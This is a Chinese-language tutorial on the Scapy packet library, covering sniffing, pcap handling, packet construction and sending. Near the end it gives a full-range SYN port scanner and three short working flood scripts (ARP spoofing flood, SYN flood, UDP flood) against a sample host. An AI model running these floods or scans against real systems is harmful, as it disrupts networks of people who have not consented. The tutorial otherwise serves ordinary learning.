# Scapy模块

`Scapy`是一款强大的交互式数据包处理工具、数据包生成器、网络扫描器、网络发现、攻击工具和嗅探工具，能灵活地构造各种数据包、发送数据包、嗅探、应答和反馈匹配等功能。



## 下载和安装

```shell
pip install --pre scapy[basic] -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
```

提示如下信息表示安装成功

```python
C:\Users\shunyu>scapy -H
Welcome to Scapy (2.5.0rc2) using IPython 8.5.0
>>>
```



## 使用Scapy抓包

`sniff`是`scapy`中的一个函数，用于在网络上捕获数据包并对其进行分析,可以通过 `sniff` 函数来指定要捕获的数据包的数量、协议、过滤条件等。以下是`sniff()`函数的详细用法：

```python
sniff(filter=None,iface=None,count=0,prn=None,offline=None,stop_filter=None,timeout=None,)
```

参数说明：

- `iface`：数据类型为 `str` 或者 `list`，默认为`None`，默认抓取所有接口的列表。抓包的接口或者接口列表，`'eth0' or ['eth0','eth1','eth2']`

- `count`: 数据类型为`int`，用于指定要捕获的数据包数量，0表示无限制。
- `timeout`: 数据类型为`int` 或者 `float` 用于指定捕获数据包的超时时间，单位为秒
- `filter`: 数据类型为`str`，用于过滤数据包的`BPF`过滤器表达式

```
BPF(Berkeley Packet Filter)过滤规则，wireshark和tcpdump也使用的是BPF过滤器。
dst host 192.168.0.1：目的IP为192.168.0.1的报文
host 192.168.0.1：IP地址为192.168.0.1的报文
tcp port 80：TCP端口号为80的报文（HTTP报文）
tcp portrange 1-25：TCP端口范围1-25的报文
not broadcast：排除广播报文
```

- `prn`: 数据类型为`function`，默认值为`None`。传入一个任意类型的返回值的回调函数，即作为参数传入并调用的函数，一般是`lambda`函数。当且仅当`prn`的返回值为`None`时，`sniff`不会打印它，其余情况`sniff`都会把它打印到显示器上。
- `stop_filter`：数据类型为`function`，默认值为`None`。传入一个返回值为`bool`的函数，一般为`lambda`函数。会将每一个抓获的包放入这个函数，当返回值为`True`时，停止抓包。
- `offline`: 数据类型为`str` 或者  `list` 读取 `pcap` 文件或者是文件列表，`'/root/xxx.pcap' or ['/root/xxx.pcap','/root/xxx2.pcap']`
- `return`：以`PacketList`的形式返回抓到的包

```python
# 例子
# 抓取两个源ip为10.182.79.36的icmp报文,并展示抓到的包的概要
# pkt.summary()列出包的摘要 pkt可以是单个包，也可以是多个包组成的PacketList
>>>pkts = sniff(filter="icmp and src host 10.182.79.36", count=2, prn=lambda x:x.summary())
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
<Sniffed: TCP:0 UDP:0 ICMP:2 Other:0>

# 抓取icmp报文，直到源ip为10.182.79.36,并存储到桌面
>>>pkts = sniff(filter="icmp", prn=lambda x:x.summary(),stop_filter=lambda x:x[IP].src == '10.182.79.36')
Ether / IP / ICMP 10.231.3.236 > 10.182.79.38 echo-request 0 / Raw
Ether / IP / ICMP 10.182.79.38 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.231.3.236 > 10.182.79.37 echo-request 0 / Raw
Ether / IP / ICMP 10.182.79.37 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.231.3.236 > 10.182.79.39 echo-request 0 / Raw
Ether / IP / ICMP 10.231.3.218 > 10.231.3.236 dest-unreach port-unreachable / IPerror / UDPerror / LLMNRResponse
Ether / IP / ICMP 10.231.3.236 > 10.182.79.36 echo-request 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
<Sniffed: TCP:0 UDP:0 ICMP:8 Other:0>
# wrpcap将数据包导出为.pcap文件
>>>wrpcap(r'C:\Users\shunyu\Desktop\1234.pcap',pkts)

# 从桌面导入报文
>>>pkts = sniff(prn=lambda x:x.summary(),offline=r'C:\Users\shunyu\Desktop\1234.pcap')

# 在Ethernet0上抓取icmp报文，直到抓到源ip为10.182.79.36的包时，停止抓包
>>> sniff(filter="icmp", prn=lambda x:x.summary(),stop_filter=lambda x:x[IP].src == '10.182.79.36',iface='Ethernet0')
Ether / IP / ICMP 10.231.3.236 > 10.182.79.37 echo-request 0 / Raw
Ether / IP / ICMP 10.182.79.37 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.231.3.236 > 10.182.79.37 echo-request 0 / Raw
Ether / IP / ICMP 10.182.79.37 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.231.3.236 > 10.182.79.36 echo-request 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
<Sniffed: TCP:0 UDP:0 ICMP:6 Other:0>
```

`AsyncSniffer`是`scapy`中的一个类，用于异步地捕获和处理网络数据包，参数基本和`sniff`一致

```python
# 使用AsyncSniffer异步抓包期间输入hello world
>>> t = AsyncSniffer(filter='icmp and src host 10.182.79.36',prn=lambda x:x.summary())
# t.start() 开始抓包
>>> t.start()
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
>>> print('hello world')
hello world
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
Ether / IP / ICMP 10.182.79.36 > 10.231.3.236 echo-reply 0 / Raw
# t.stop() 停止抓包
>>> t.stop()
<Sniffed: TCP:0 UDP:0 ICMP:6 Other:0>
# t.results 获取抓的数据包
>>> pkt = t.results
```



## 导入和导出

可以通过`rdpcap`读取`.pcap`文件，或者使用`wrpcap`将数据包导出为`.pcap`文件

```python
# 导入.pcap文件，无论文件中有多少包，都会返回一个PacketList
# PacketList类似与列表，可以通过 [] 取其中的具体的包或者 len 计算有多少个包
pkts = rdpcap("fileName.pcap")
# 有的文件内容可能比较多，可以通过count参数只导入其中的前几个包
pkts = rdpcap("fileName.pcap",count=1)
# 除了使用rdpcap之外还可以使用sniff导入
pkts = sniff(offline=r'fileName.pcap')

# 导出
wrpcap("/root/fileName.pcap",pkts)
```



## 解析数据包

**准备数据**：解析数据包之前先要获取数据包，可以使用`rdpcap`导入`.pcap`数据包 或者使用 `sniff`抓取数据包

```python
pkts = wrpcap("/root/fileName.pcap",pkts)
```

`pkt.summary()`列出包的摘要信息pkt可以是单个包，也可以是多个包组成的`PacketList`

```python
# 使用summary列出一组包的摘要信息
>>> pkts.summary()
Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
Ether / IP / TCP 192.168.10.6:53213 > 222.92.61.107:4499 A
Ether / IP / TCP 192.168.10.6:53213 > 222.92.61.107:4499 PA / Raw
Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
# 使用summary列出一个包的摘要信息
>>> pkts[0].summary()
Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
```

`pkt.show()`以人类可读的方式打印出数据包的各个字段和对应的值，可以是单个包，也可以是多个包组成的`PacketList`。如果展示的是多个包组成的`PacketList`，只会输出每个数据包的基本信息，如源地址、目的地址、协议类型、长度等

```python
# 单个包
>>> pkts[0].show()
###[ Ethernet ]###
  dst       = b0:35:9f:26:d6:6c
  src       = 14:51:7e:58:67:c9
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 224
     id        = 42053
     flags     =
     frag      = 0
     ttl       = 122
     proto     = tcp
     chksum    = 0xb55c
     src       = 222.92.61.107
     dst       = 192.168.10.6
     \options   \
###[ TCP ]###
        sport     = 4499
        dport     = 53213
        seq       = 2506396920
        ack       = 1338204138
        dataofs   = 5
        reserved  = 0
        flags     = PA
        window    = 65340
        chksum    = 0xe0f9
        urgptr    = 0
        options   = []
###[ Raw ]###
           load      = '|r\x00\\xb4U\x00\x00,\x00\x00\\xfeH\\x88xdf߸\\xf6'

# 多个包
>>> pkts.show()
0000 Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
0001 Ether / IP / TCP 192.168.10.6:53213 > 222.92.61.107:4499 A
0002 Ether / IP / TCP 192.168.10.6:53213 > 222.92.61.107:4499 PA / Raw
0003 Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
0004 Ether / IP / TCP 222.92.61.107:4499 > 192.168.10.6:53213 PA / Raw
```

`ls(pkt)`查看数据包各个字段的含义

```python
>>> ls(pkts[0])
dst        : DestMACField                        = 'b0:35:9f:26:d6:6c' ('None')
src        : SourceMACField                      = '14:51:7e:58:67:c9' ('None')
type       : XShortEnumField                     = 2048            ('36864')
--
version    : BitField  (4 bits)                  = 4               ('4')
ihl        : BitField  (4 bits)                  = 5               ('None')
tos        : XByteField                          = 0               ('0')
len        : ShortField                          = 224             ('None')
id         : ShortField                          = 42053           ('1')
flags      : FlagsField                          = <Flag 0 ()>     ('<Flag 0 ()>')
frag       : BitField  (13 bits)                 = 0               ('0')
ttl        : ByteField                           = 122             ('64')
proto      : ByteEnumField                       = 6               ('0')
chksum     : XShortField                         = 46428           ('None')
src        : SourceIPField                       = '222.92.61.107' ('None')
dst        : DestIPField                         = '192.168.10.6'  ('None')
options    : PacketListField                     = []              ('[]')
--
sport      : ShortEnumField                      = 4499            ('20')
dport      : ShortEnumField                      = 53213           ('80')
seq        : IntField                            = 2506396920      ('0')
ack        : IntField                            = 1338204138      ('0')
dataofs    : BitField  (4 bits)                  = 5               ('None')
reserved   : BitField  (3 bits)                  = 0               ('0')
flags      : FlagsField                          = <Flag 24 (PA)>  ('<Flag 2 (S)>')
window     : ShortField                          = 65340           ('8192')
chksum     : XShortField                         = 57593           ('None')
urgptr     : ShortField                          = 0               ('0')
options    : TCPOptionsField                     = []              ("b''")
--
load       : StrField                            = b'|r\x00\xb4U\x00\x00,\x00\x00\xfeH\x88\xdf\xb8\xf6' ("b''")
```



## 构造数据包

### 前置知识

`ls()` 是 `scapy` 中用来列出支持的协议和字段的函数。它可以用来查看所有已经定义的协议和协议的字段，以及这些字段所包含的值的格式。

```python
>>> ls()
AH         : AH
AKMSuite   : AKM suite
ARP        : ARP
ASN1P_INTEGER : None
ASN1P_OID  : None
ASN1P_PRIVSEQ : None
ASN1_Packet : None
ATT_Error_Response : Error Response
ATT_Exchange_MTU_Request : Exchange MTU Request
ATT_Exchange_MTU_Response : Exchange MTU Response
ATT_Execute_Write_Request : Execute Write Request
ATT_Execute_Write_Response : Execute Write Response
....
# 可以通过ls查看某个协议有哪些字段，字段的默认值是什么
>>> ls(IP)
version    : BitField  (4 bits)                  = ('4')
ihl        : BitField  (4 bits)                  = ('None')
tos        : XByteField                          = ('0')
len        : ShortField                          = ('None')
id         : ShortField                          = ('1')
flags      : FlagsField                          = ('<Flag 0 ()>')
frag       : BitField  (13 bits)                 = ('0')
ttl        : ByteField                           = ('64')
proto      : ByteEnumField                       = ('0')
chksum     : XShortField                         = ('None')
src        : SourceIPField                       = ('None')
dst        : DestIPField                         = ('None')
options    : PacketListField                     = ('[]')
```

`pkt.command()` 以字符串的形式返回可生成数据包的`scapy`命令

`eval()` 用来执行一个字符串表达式，并返回表达式的值。可以搭配`pkt.command()`使用

```python
>>> tmp = pkts[0].command()
"Ether(dst='b0:35:9f:26:d6:6c', src='14:51:7e:58:67:c9', type=2048)/IP(version=4, ihl=5, tos=0, len=224, id=42053, flags=0, frag=0, ttl=122, proto=6, chksum=46428, src='222.92.61.107', dst='192.168.10.6')/TCP(sport=4499, dport=53213, seq=2506396920, ack=1338204138, dataofs=5, reserved=0, flags=24, window=65340, chksum=57593, urgptr=0)/Raw(load=b'|r\x00\xb4U\x00\x00,\x00\x00\xfeH\x88\xdf\xb8\xf6')"
>>> my_pkt = eval(tmp)
>>> my_pkt == pkts[0]
True
```

`Scapy`中，构造数据包时使用的是分层结构，每一层协议对应一个类，例如：`IP()`表示`IP`层协议，`TCP()`表示`TCP`层协议等

```python
# 构造一个源IP为10.182.79.36 目的IP为10.182.79.35的IP报文
# 方式1
>>> my_ip = IP(src='10.182.79.36',dst='10.182.79.35')

# 方式2
>>> my_ip = IP()
>>> my_ip.src = '10.182.79.36'
>>> my_ip.dst = '10.182.79.35'

# 构造一个源端口为80 目的端口为8080的TCP层报文
>>> my_tcp = TCP(sport=80, dport=8080)
```

"/"是协议层之间的分隔符，这个 / 运算符用作两层之间的合成运算符，下层可以根据上层重新设置部分合理的字段

```python
>>> my_ip = IP(src='10.182.79.36',dst='10.182.79.35')
# 只有单个IP层时，proto字段为0
>>> my_ip.proto
0
>>> my_pkt = my_ip / TCP(dport=80,sport=9996)
# 当IP层和TCP层叠加时，网络协议号被设置为6表示上层协议为tcp
>>> my_pkt.proto
6
```

一个数据包中可能有多层报文，不同层的报文中可能有相同的属性值。例如：链路层的Ether中有属性为`src`，网络层的`IP`中也有`src`，如果直接通过`pkt.src`的形式来取值，会取到下层中的`src`，也就是`Ether`报文的`src`，可以通过`pkt[IP].src`的形式来取`IP`报文中的`src`

```python
>>> ls(Ether)
dst        : DestMACField                        = ('None')
src        : SourceMACField                      = ('None')
type       : XShortEnumField                     = ('36864')
>>> ls(IP)
version    : BitField  (4 bits)                  = ('4')
ihl        : BitField  (4 bits)                  = ('None')
tos        : XByteField                          = ('0')
len        : ShortField                          = ('None')
id         : ShortField                          = ('1')
flags      : FlagsField                          = ('<Flag 0 ()>')
frag       : BitField  (13 bits)                 = ('0')
ttl        : ByteField                           = ('64')
proto      : ByteEnumField                       = ('0')
chksum     : XShortField                         = ('None')
src        : SourceIPField                       = ('None')
dst        : DestIPField                         = ('None')
options    : PacketListField                     = ('[]')
>>> xxx = Ether(src='11:11:11:11:11:11') / IP(src='1.1.1.1')
>>> xxx.src
'11:11:11:11:11:11'
>>> xxx[IP].src
'1.1.1.1'
```

构造一组数据包

```python
# 生成一组数据包
# a = [i for i in Iterable]为列表推导式，其结果等于下面的循环
# a = []
# for i in Iterable:
#     a.append(i)
>>> z = IP(src='10.182.79.36/30')
>>> z
<IP  src=Net("10.182.79.36/30") |>
>>> [i for i in z]
[<IP  src=10.182.79.36 |>,
 <IP  src=10.182.79.37 |>,
 <IP  src=10.182.79.38 |>,
 <IP  src=10.182.79.39 |>]

# 生成三个IP层报文 ttl分别为1, 2, 3
>>> z = IP(ttl=[1,2,3])
>>> [i for i in z]
[<IP  ttl=1 |>,
 <IP  ttl=2 |>,
 <IP  ttl=3 |>]

# 生成目的端口号为1-65535，源端口随机的TCP报文
# 
>>> z = TCP(sport=RandShort(), dport=(1,65535))

# 所有字段之间使用笛卡尔积生成
>>> z = IP(src='1.1.1.1/31') / TCP(sport=[88,99])
>>> [i for i in z]
[<IP  frag=0 proto=tcp src=1.1.1.0 |<TCP  sport=kerberos |>>,
 <IP  frag=0 proto=tcp src=1.1.1.0 |<TCP  sport=99 |>>,
 <IP  frag=0 proto=tcp src=1.1.1.1 |<TCP  sport=kerberos |>>,
 <IP  frag=0 proto=tcp src=1.1.1.1 |<TCP  sport=99 |>>]
```

可以使用`fuzz()`函数来生成针对某个协议的模糊测试数据包，该函数会自动探测协议中的所有字段，然后对每个字段生成多个异常、无效或随机的数据，以生成一组模糊测试数据包。

```python
>>> z = fuzz(IP(src='1.1.1.1') /TCP(dport=80))
```

### 构造报文

- 先通过`Scapy`抓一个真实的报文或者通过`rdpcap`导入一个真实的报文
- 然后通过`pkt.show()`展示报文的结构
- 按照报文结构一步一步的构造出数据包

```python
# 这里使用抓到的ICMP报文
>>> x.show()
###[ Ethernet ]###
  dst       = 00:50:56:bc:04:1b
  src       = 00:1c:54:52:28:89
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 11847
     flags     =
     frag      = 0
     ttl       = 60
     proto     = icmp
     chksum    = 0xe7cd
     src       = 10.182.79.36
     dst       = 10.231.3.236
     \options   \
###[ ICMP ]###
        type      = echo-reply
        code      = 0
        chksum    = 0x544c
        id        = 0x1
        seq       = 0x10f
        unused    = ''
###[ Raw ]###
           load      = 'abcdefghijklmnopqrstuvwabcdefghi'

# 构造多层报文时只需要把每层的重要字段设置一下，下层可以根据上层重载一个或多个默认字段
my_ether = Ether(dst='00:50:56:bc:04:1b',src='00:1c:54:52:28:89')
my_ip = IP(src='10.182.79.36',dst='10.231.3.236')
# 通过ls(ICMP)可知，ICMP的type字段默认为echo-request，但是上面抓到的包为echo-reply
# 可以通过ICMP(type='echo-reply') 或者 ICMP(type=0)来修改
my_icmp = ICMP(type='echo-reply')
my_load = 'abcdefghijklmnopqrstuvwabcdefghi'
my_pkt = my_ether / my_ip / my_icmp / my_load
my_pkt.show()

# 输出结果
###[ Ethernet ]###
  dst       = 00:50:56:bc:04:1b
  src       = 00:1c:54:52:28:89
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = None
     src       = 10.182.79.36
     dst       = 10.231.3.236
     \options   \
###[ ICMP ]###
        type      = echo-reply
        code      = 0
        chksum    = None
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'abcdefghijklmnopqrstuvwabcdefghi'
```



## 发送数据包

### 发送数据包，不接受报文

`send` 是 `Scapy` 中用于发送发送3层数据包的函数，不接收数据包，用法如下：

```python
send(packet, iface=None, verbose=2, return_packets=0, inter=0, loop=0, count=1)
```

参数说明：

- `packet`: 被发送的数据包。
- `iface`: 指定要发送的网卡，默认情况下，如果没有指定接口，`Scapy` 会选择默认网关（如果有）或第一个可用接口。
- `count`: 发送数据包的次数，默认是1。
- `inter`: 发送间隔时间（秒），默认是0。
- `loop`: 是否循环发送数据包，0 不循环发送，1 循环发送数据包，默认为0。
- `verbose`: 设置是否显示详细的发送信息，可选值为0/1/2，0 不显示发送信息， 1 显示简略信息，2 显示详细信息，默认是2。
- `return_packets`: 是否返回接收到的数据包，默认是0。

```python
# 每隔2秒向10.182.79.37发送ICMP报文，总共发送3个数据包
>>> my_pkt = IP(dst='10.182.79.37') / ICMP()
>>> pkt = send(my_pkt,loop=1,inter=2,count=3,return_packets=1)
...
Sent 3 packets.
>>> pkt
<PacketList: TCP:0 UDP:0 ICMP:3 Other:0>
```

`sendp`：是 `Scapy` 中用于发送发送2层数据包的函数，不接收数据包，用法和`send`一致

```python
>>> my_pkt = Ether(dst='00:0c:29:5a:c5:cd') / IP(dst='10.182.79.37') / ICMP()
>>> pkt = sendp(my_pkt,loop=1,inter=2,count=3,return_packets=1)
...
Sent 3 packets.
>>> pkt
<PacketList: TCP:0 UDP:0 ICMP:3 Other:0>
```

### 发送数据包并且接收响应报文

`sr`：发送且接收3层数据包，返回有回应的数据包和没有回应的数据包

```python
sr(pkt, timeout=None, inter=0, verbose=2, retry=0)
```

部分参数详解：

- `pkt`：被发送的数据包
- `timeout`：等待响应的超时时间（秒）
- `inter`： 两次发送数据包之间的间隔时间（秒）
- `verbose`：设置是否显示详细的发送信息，可选值为0/1/2，0 不显示发送信息， 1 显示简略信息，2 显示详细信息，默认是2。
- `retry`：则表示重发未应答数据包的次数
- `return`：`sr()`函数返回一个元组`(answered, unanswered)`，分别表示收到响应的数据包和未收到响应的数据包。其中，`answered`和`unanswered`都是`PacketList`对象，可以通过`len()`函数获取其长度。每个元素都是一个三元组`(send_packet, recv_packet, extra_info)`，表示发送的数据包、收到的响应包以及一些额外信息。

```python
# 构造一组ping包 10.182.28.8-11 其中只有10.182.28.9这个ip可以ping通
>>> ans, unans = sr(IP(dst='10.182.28.8/30') / ICMP(), timeout=2)
Begin emission:
Finished sending 4 packets.

Received 421 packets, got 1 answers, remaining 3 packets # 收到1个回应，还有3个没有收到
>>> ans.summary() # 只有28.9收到了回应
IP / ICMP 10.182.79.36 > 10.182.28.9 echo-request 0 ==> IP / ICMP 10.182.28.9 > 10.182.79.36 echo-reply 0 / Padding
>>> unans.summary() # 28.8, 28.10, 28,11 都没有收到
IP / ICMP 10.182.79.36 > 10.182.28.8 echo-request 0
IP / ICMP 10.182.79.36 > 10.182.28.10 echo-request 0
IP / ICMP 10.182.79.36 > 10.182.28.11 echo-request 0

# 有时候网络环境较差、或者arp表中没有对应IP地址的映射，会导致第一次发送icmp报文时得不到响应，使用retry可以缓解该问题
>>> ans, unans = sr(IP(dst='10.182.29.8/30') / ICMP(), timeout=2, retry=1)
Begin emission:
Finished sending 4 packets.
Begin emission:
Finished sending 2 packets.

Received 3092 packets, got 2 answers, remaining 2 packets
>>> unans.show()
0000 IP / ICMP 10.182.79.36 > 10.182.29.10 echo-request 0
0001 IP / ICMP 10.182.79.36 > 10.182.29.11 echo-request 0
>>> ans.show()
0000 IP / ICMP 10.182.79.36 > 10.182.29.8 echo-request 0 ==> IP / ICMP 10.182.29.8 > 10.182.79.36 echo-reply 0 / Padding
0001 IP / ICMP 10.182.79.36 > 10.182.29.9 echo-request 0 ==> IP / ICMP 10.182.29.9 > 10.182.79.36 echo-reply 0 / Padding
```

`sr1`：发送3层数据包，使用方式和`sr`一致，但是只接收1个响应包并返回

```python
>>> result = sr1(IP(dst='10.182.29.8/30') / ICMP(), timeout=2)
Begin emission:
Finished sending 4 packets.

Received 697 packets, got 2 answers, remaining 2 packets
>>> result.summary()
'IP / ICMP 10.182.29.8 > 10.182.79.36 echo-reply 0 / Padding'
>>> result
<IP  version=4 ihl=5 tos=0x0 len=28 id=29696 flags= frag=0 ttl=125 proto=icmp chksum=0x4849 src=10.182.29.8 dst=10.182.79.36 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>
```

`srp`：发送且接收2层数据包，使用方式和`sr`一致

`srp1`：发送2层数据包，只接收1个响应包，使用方式和`srp`一致



## 实用脚本

**实现nmap中的端口探测**：使用`TCP`协议发送一个`SYN`数据包到目标主机的每一个端口，以确定哪些端口是开放的。如果目标主机响应了一个`SYN/ACK`数据包，表示该端口是打开的，并且`Nmap`会发送一个`RST`数据包来关闭连接。如果目标主机没有响应或者响应一个`RST`数据包，表示该端口是关闭的。

```python
from scapy.all import *

dst_ip = "10.182.28.2"
start_port = 1
end_port = 65535

open_ports = []

for dst_port in range(start_port, end_port+1):
    tcp_syn_packet = IP(dst=dst_ip) / TCP(dport=dst_port, flags="S")
    response = sr1(tcp_syn_packet, timeout=0.01, verbose=0)

    if response is not None and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
        print(f"Port {dst_port} is open")
        open_ports.append(dst_port)
    else:
        print(f"Port {dst_port} is closed")

print(f"Open ports: {open_ports}")
```

**ARP 洪泛攻击**：`ARP` 洪泛攻击是一种基于 `ARP` 协议的攻击方式，它的原理是发送大量虚假的 `ARP` 请求，从而让目标设备的 `ARP` 缓存表被填满或被污染，导致目标设备无法正常进行网络通信。使用 `scapy` 实现 `ARP` 洪泛攻击的代码如下：

```python
# 构造 ARP 请求包
packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', hwsrc='00:11:22:33:44:55', psrc='192.168.1.1', pdst='192.168.1.100')

# 发送 ARP 请求包
while True:
    sendp(packet)
```

**SYN 洪泛攻击**：`SYN` 洪泛攻击是一种基于 `TCP` 协议的攻击方式，它的原理是发送大量的 `TCP SYN` 包，从而占用目标设备的资源或使其崩溃。使用 `scapy` 实现 SYN 洪泛攻击的代码如下：

```python
# 构造 TCP SYN 包
packet = IP(dst='192.168.1.100') / TCP(sport=1234, dport=80, flags='S')

# 发送 TCP SYN 包
while True:
    send(packet)
```

**UDP 洪泛攻击**：`UDP` 洪泛攻击是一种基于 `UDP` 协议的攻击方式，它的原理是发送大量的 `UDP` 包，从而占用目标设备的带宽或使其崩溃。使用 `scapy` 实现 `UDP` 洪泛攻击的代码如下：

```python
# 构造 UDP 包
packet = IP(dst='192.168.1.100') / UDP(sport=1234, dport=80)

# 发送 UDP 包
while True:
    send(packet)
```



## 类型转换

`Scapy`中很多协议字段的值为`bytes`类型，所以介绍一些类型转换的函数

### str与bytes之间的转换

```python
b = b'example'
s = 'example'

# str -> bytes
bytes(s,encoding='utf8')
str.encode(s,encoding='utf8')

# bytes -> str
str(b,encoding='utf8')
bytes.decode(b,encoding='utf8')
```

### IP与bytes之间的转换

```python
# ip -> 16进制字符串 -> bytes
import ipaddress
ip_hexStr = hex(int(ipaddress.ip_address('1.1.1.1')))      # 输出 '0x1010101'
ip_bytes = bytes.fromhex(ip_hexStr[2:].zfill(8))      # 输出 b'\x01\x01\x01\x01' ,如果是IPv6地址，需要使用zfill填充为32位


# bytes -> 16进制字符串 -> ip
ip_hexStr = bytes.hex(ip_bytes)      # 输出 '01010101'
ip =  str(ipaddress.ip_address(int(ip_hexStr,base=16)))    # 输出1.1.1.1
```



## 参考教程

[Usage — Scapy 2.4.5. documentation](https://scapy.readthedocs.io/en/latest/usage.html#binary-string)

[使用 — Scapy 2.4.4. 文档 (osgeo.cn)](https://www.osgeo.cn/scapy/usage.html#icmp-ping)







